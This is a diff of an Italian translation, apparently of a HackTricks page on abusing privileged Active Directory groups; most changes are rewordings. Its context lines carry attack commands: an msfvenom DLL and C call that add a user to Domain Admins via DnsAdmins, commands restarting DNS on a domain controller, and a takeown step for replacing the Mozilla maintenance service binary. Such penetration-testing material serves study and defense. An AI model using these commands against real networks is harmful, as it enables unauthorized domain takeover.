@@ -18,7 +18,7 @@ Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) per costruire e **automatizzare flussi di lavoro** alimentati dagli **strumenti comunitari più avanzati** al mondo.\
-Ottieni Accesso Oggi:
+Accedi Oggi:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
@@ -60,7 +60,7 @@ L'appartenenza a questo gruppo consente la lettura degli oggetti di Active Direc
 ```bash
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
-### Accesso al Controller di Dominio
+### Accesso al Domain Controller
 
 L'accesso ai file sul DC è limitato a meno che l'utente non faccia parte del gruppo `Server Operators`, il che cambia il livello di accesso.
 
@@ -150,7 +150,7 @@ Per una dimostrazione pratica, vedere [VIDEO DIMOSTRATIVO CON IPPSEC](https://ww
 
 ## DnsAdmins
 
-I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi di SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa capacità consente un significativo potenziale di sfruttamento.
+I membri del gruppo **DnsAdmins** possono sfruttare i loro privilegi per caricare una DLL arbitraria con privilegi di SYSTEM su un server DNS, spesso ospitato su Domain Controllers. Questa capacità consente un potenziale di sfruttamento significativo.
 
 Per elencare i membri del gruppo DnsAdmins, utilizzare:
 ```powershell
@@ -178,18 +178,18 @@ system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /doma
 // Generate DLL with msfvenom
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-Riavviare il servizio DNS (che potrebbe richiedere permessi aggiuntivi) è necessario affinché il DLL venga caricato:
+Riavviare il servizio DNS (che potrebbe richiedere autorizzazioni aggiuntive) è necessario affinché il DLL venga caricato:
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-Per ulteriori dettagli su questo vettore di attacco, fare riferimento a ired.team.
+Per ulteriori dettagli su questo vettore d'attacco, fare riferimento a ired.team.
 
 #### Mimilib.dll
 È anche possibile utilizzare mimilib.dll per l'esecuzione di comandi, modificandolo per eseguire comandi specifici o reverse shell. [Controlla questo post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) per ulteriori informazioni.
 
 ### Record WPAD per MitM
-I DnsAdmins possono manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM) creando un record WPAD dopo aver disabilitato l'elenco globale di blocco delle query. Strumenti come Responder o Inveigh possono essere utilizzati per il spoofing e la cattura del traffico di rete.
+I DnsAdmins possono manipolare i record DNS per eseguire attacchi Man-in-the-Middle (MitM) creando un record WPAD dopo aver disabilitato l'elenco globale di blocco delle query. Strumenti come Responder o Inveigh possono essere utilizzati per spoofing e cattura del traffico di rete.
 
 ### Lettori di Log degli Eventi
 I membri possono accedere ai log degli eventi, trovando potenzialmente informazioni sensibili come password in chiaro o dettagli sull'esecuzione di comandi:
@@ -205,16 +205,16 @@ Questo gruppo può modificare i DACL sugli oggetti di dominio, potenzialmente co
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 ```
 ## Hyper-V Administrators
-Gli amministratori di Hyper-V hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controller virtualizzati. Questo include la clonazione di DC live ed estraendo gli hash NTLM dal file NTDS.dit.
+Gli amministratori di Hyper-V hanno accesso completo a Hyper-V, che può essere sfruttato per ottenere il controllo sui Domain Controller virtualizzati. Questo include la clonazione di DC attivi ed estraendo gli hash NTLM dal file NTDS.dit.
 
 ### Esempio di sfruttamento
-Il servizio di manutenzione di Mozilla Firefox può essere sfruttato dagli amministratori di Hyper-V per eseguire comandi come SYSTEM. Questo comporta la creazione di un hard link a un file SYSTEM protetto e la sua sostituzione con un eseguibile malevolo:
+Il servizio di manutenzione di Mozilla Firefox può essere sfruttato dagli amministratori di Hyper-V per eseguire comandi come SYSTEM. Questo comporta la creazione di un collegamento fisico a un file di sistema protetto e la sua sostituzione con un eseguibile malevolo:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-Nota: Sfruttare i collegamenti hard è stato mitigato negli aggiornamenti recenti di Windows.
+Nota: Lo sfruttamento dei collegamenti hard è stato mitigato negli aggiornamenti recenti di Windows.
 
 ## Gestione dell'Organizzazione
 
@@ -231,7 +231,7 @@ Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
 Per tecniche di sfruttamento più dettagliate relative a **`SeLoadDriverPrivilege`**, è consigliabile consultare risorse di sicurezza specifiche.
 
-#### Utenti Desktop Remoto
+#### Utenti di Desktop Remoto
 I membri di questo gruppo hanno accesso ai PC tramite il Protocollo Desktop Remoto (RDP). Per enumerare questi membri, sono disponibili comandi PowerShell:
 ```powershell
 Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
@@ -248,7 +248,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Us
 Per le tecniche di sfruttamento relative a **WinRM**, è necessario consultare documentazione specifica.
 
 #### Server Operators
-Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controller, inclusi i privilegi di backup e ripristino, la modifica dell'ora di sistema e lo spegnimento del sistema. Per enumerare i membri, il comando fornito è:
+Questo gruppo ha i permessi per eseguire varie configurazioni sui Domain Controllers, inclusi privilegi di backup e ripristino, modifica dell'ora di sistema e spegnimento del sistema. Per enumerare i membri, il comando fornito è:
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
@@ -271,7 +271,7 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) per costruire e **automatizzare flussi di lavoro** facilmente, alimentati dagli **strumenti** della comunità **più avanzati** al mondo.\
+Usa [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) per costruire e **automatizzare i flussi di lavoro** alimentati dagli **strumenti** della comunità **più avanzati** al mondo.\
 Accedi oggi:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
